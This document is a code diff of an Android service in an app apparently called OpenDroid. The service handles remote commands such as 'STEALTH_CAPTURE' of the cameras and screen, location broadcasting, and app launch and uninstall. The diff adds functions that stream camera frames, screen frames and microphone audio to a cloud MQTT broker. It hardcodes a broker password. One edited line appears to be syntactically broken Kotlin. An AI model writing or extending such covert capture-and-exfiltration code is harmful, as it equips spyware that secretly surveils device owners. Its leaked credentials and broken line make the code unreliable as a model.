@@ -55,7 +55,6 @@ class LocalFileServerService : Service() {
     private var isServerStartingOrRunning = false
     private lateinit var baseDir: File
     private var currentRingtone: Ringtone? = null
-
     private val wsMessageChannel = Channel<String>(Channel.UNLIMITED)
     private val mqttSendChannel = Channel<String>(Channel.UNLIMITED)
     private var mqttClient: MqttClient? = null
@@ -86,6 +85,7 @@ class LocalFileServerService : Service() {
         instance = this
         val prefs = getSharedPreferences("opendroid_prefs", Context.MODE_PRIVATE)
         currentPairingCode = prefs.getString("pairing_code", currentPairingCode) ?: currentPairingCode
+
         baseDir = getExternalFilesDir(null) ?: filesDir
         createNotificationChannel()
         registerReceiver(batteryReceiver, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
@@ -105,6 +105,7 @@ class LocalFileServerService : Service() {
         teleManager.onLocationUpdated = { locJson ->
             broadcastMessage(locJson.toString())
         }
+
         stealthCaptureManager = StealthCaptureManager(applicationContext)
 
         startMqttWorker()
@@ -134,12 +135,7 @@ class LocalFileServerService : Service() {
             .build()
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            val serviceType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
-            } else {
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-            }
-            startForeground(NOTIFICATION_ID, notification, serviceType)
+            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
         } else {
             startForeground(NOTIFICATION_ID, notification)
         }
@@ -160,6 +156,7 @@ class LocalFileServerService : Service() {
         }
     }
 
+    // Dedicated EMQX Serverless Private Cluster (SSL Encrypted)
     private fun initCloudBridge() {
         serviceScope.launch {
             try {
@@ -168,17 +165,18 @@ class LocalFileServerService : Service() {
                 mqttClient = MqttClient(brokerUrl, clientId, MemoryPersistence())
 
                 val options = MqttConnectOptions().apply {
-                    userName = "opendroid_user"
-                    password = "OpendroidPassword123!".toCharArray()
-                    connectionTimeout = 30
-                    keepAliveInterval = 60
-                    isAutomaticReconnect = true
-                    isCleanSession = true
+                    userName = "OpenDroid-v1"
+                    password = "OpenDroid-v1@kakaxi69".toCharArray()
                     socketFactory = SSLSocketFactory.getDefault()
+                    isCleanSession = true
+                    connectionTimeout = 15
+                    keepAliveInterval = 30
+                    isAutomaticReconnect = true
                 }
 
                 mqttClient?.setCallback(object : MqttCallbackExtended {
                     override fun connectComplete(reconnect: Boolean, serverURI: String?) {
+                        Log.d("CloudBridge", "Connected to Dedicated EMQX: $currentPairingCode")
                         isCloudConnected = true
                         serviceScope.launch(Dispatchers.Main) {
                             onCloudStatusChanged?.invoke(true)
@@ -187,6 +185,7 @@ class LocalFileServerService : Service() {
                     }
 
                     override fun connectionLost(cause: Throwable?) {
+                        Log.w("CloudBridge", "Connection lost", cause)
                         isCloudConnected = false
                         serviceScope.launch(Dispatchers.Main) {
                             onCloudStatusChanged?.invoke(false)
@@ -268,50 +267,11 @@ class LocalFileServerService : Service() {
                     put("type", "BATTERY")
                     put("percent", pct)
                     put("charging", isCharging)
-                    put("device", Build.MODEL)
                 }
                 broadcastMessage(json.toString())
             }
         } catch (e: Exception) {
             e.printStackTrace()
-        }
-    }
-
-    private fun sendDirectCameraFrame(base64Jpeg: String) {
-        val json = JSONObject().apply {
-            put("type", "CAMERA_FRAME")
-            put("data", base64Jpeg)
-        }
-        val jsonStr = json.toString()
-        wsMessageChannel.trySend(jsonStr)
-        serviceScope.launch(Dispatchers.IO) {
-            try {
-                if (mqttClient?.isConnected == true) {
-                    val mqttMsg = MqttMessage(jsonStr.toByteArray()).apply { qos = 0 }
-                    mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
-                }
-            } catch (e: Exception) {
-                Log.e("DirectCamera", "Error publishing camera frame over MQTT", e)
-            }
-        }
-    }
-
-    private fun sendDirectAudioChunk(base64Pcm: String) {
-        val json = JSONObject().apply {
-            put("type", "AUDIO_CHUNK")
-            put("data", base64Pcm)
-        }
-        val jsonStr = json.toString()
-        wsMessageChannel.trySend(jsonStr)
-        serviceScope.launch(Dispatchers.IO) {
-            try {
-                if (mqttClient?.isConnected == true) {
-                    val mqttMsg = MqttMessage(jsonStr.toByteArray()).apply { qos = 0 }
-                    mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
-                }
-            } catch (e: Exception) {
-                Log.e("DirectAudio", "Error publishing audio chunk over MQTT", e)
-            }
         }
     }
 
@@ -330,8 +290,10 @@ class LocalFileServerService : Service() {
         }
         val jsonStr = response.toString()
 
+        // 1. Send to local WebSocket clients
         wsMessageChannel.trySend(jsonStr)
 
+        // 2. Direct send to Cloud MQTT with QoS 0 (avoids Paho QoS 1 buffer overflow on large image payloads)
         serviceScope.launch(Dispatchers.IO) {
             try {
                 if (mqttClient?.isConnected == true) {
@@ -340,7 +302,58 @@ class LocalFileServerService : Service() {
                     Log.d("StealthCapture", "Dispatched $target capture result via MQTT (qos 0)")
                 }
             } catch (e: Exception) {
-                Log.e("StealthCapture", "MQTT Direct Publish Error for $target", e)
+                Log.e("StealthCapture", "Error publishing stealth capture result", e)
+            }
+        }
+    }
+
+    fun sendDirectCameraFrame(base64Frame: String) {
+        val json = JSONObject().apply {
+            put("type", "CAMERA_FRAME")
+            put("frame", base64Frame)
+        }.toString()
+
+        wsMessageChannel.trySend(json)
+        if (mqttClient?.isConnected == true) {
+            try {
+                val mqttMsg = MqttMessage(json.toByteArray()).apply { qos = 0 }
+                mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
+            } catch (e: Exception) {
+                Log.e("DirectCamera", "Frame publish error", e)
+            }
+        }
+    }
+
+    fun sendDirectScreenFrame(base64Frame: String) {
+        val json = JSONObject().apply {
+            put("type", "SCREEN_FRAME")
+            put("frame", base64Frame)
+        }.toString()
+
+        wsMessageChannel.trySend(json)
+        if (mqttClient?.isConnected == true) {
+            try {
+                val mqttMsg = MqttMessage(json.toByteArray()).apply { qos = 0 }
+                mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
+            } catch (e: Exception) {
+                Log.e("DirectScreen", "Screen frame publish error", e)
+            }
+        }
+    }
+
+    fun sendDirectAudioChunk(base64Pcm: String) {
+        val json = JSONObject().apply {
+            put("type", "AUDIO_CHUNK")
+            put("data", base64Pcm)
+        }.toString()
+
+        wsMessageChannel.trySend(json)
+        if (mqttClient?.isConnected == true) {
+            try {
+                val mqttMsg = MqttMessage(json.toByteArray()).apply { qos = 0 }
+                mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
+            } catch (e: Exception) {
+                Log.e("AudioStream", "Audio publish error", e)
             }
         }
     }
@@ -352,7 +365,7 @@ class LocalFileServerService : Service() {
 
         when (json.optString("type")) {
             "ping" -> {
-                broadcastMessage("{\"type\":\"pong\",\"timestamp\":${json.optLong("timestamp")}}")
+                broadcastMessage("{\"type\":\"pong\",\"timestamp\":${json.optLong(\"timestamp\")}}")
                 broadcastBatteryStatus()
             }
         }
@@ -362,7 +375,7 @@ class LocalFileServerService : Service() {
                 sendFullSyncData()
             }
 
-            // --- Remote URL Launcher ---
+            // --- Step 1.1: Remote URL Launcher ---
             "OPEN_URL" -> {
                 val rawUrl = json.optString("url", "").trim()
                 if (rawUrl.isNotEmpty()) {
@@ -394,7 +407,7 @@ class LocalFileServerService : Service() {
                 }
             }
 
-            // --- Remote App Management (Launch & Uninstall) ---
+            // --- Phase 1: Step 1.2 Remote App Management (Launch & Uninstall) ---
             "LAUNCH_APP" -> {
                 val pkg = json.optString("package", "").trim()
                 val success = teleManager.launchApp(pkg)
@@ -416,9 +429,11 @@ class LocalFileServerService : Service() {
                 }.toString())
             }
 
-            // --- Stealth Photo / Screenshot Capture ---
+            // =========================================================================
+            // Phase 2: Stealth Photo / Screenshot Capture (Direct QoS 0 Dispatch)
+            // =========================================================================
             "STEALTH_CAPTURE" -> {
-                val target = json.optString("target", "FRONT").uppercase()
+                val target = json.optString("target", "FRONT").uppercase() // "FRONT", "BACK", "SCREEN"
                 Log.d("StealthCapture", "Received STEALTH_CAPTURE request for target: $target")
 
                 when (target) {
@@ -482,7 +497,7 @@ class LocalFileServerService : Service() {
                 }.toString())
             }
 
-            // --- Standalone Flashlight / Torch Toggle ---
+            // --- Phase 1: Step 1.3 Standalone Flashlight / Torch Toggle ---
             "TOGGLE_STANDALONE_TORCH" -> {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                     try {
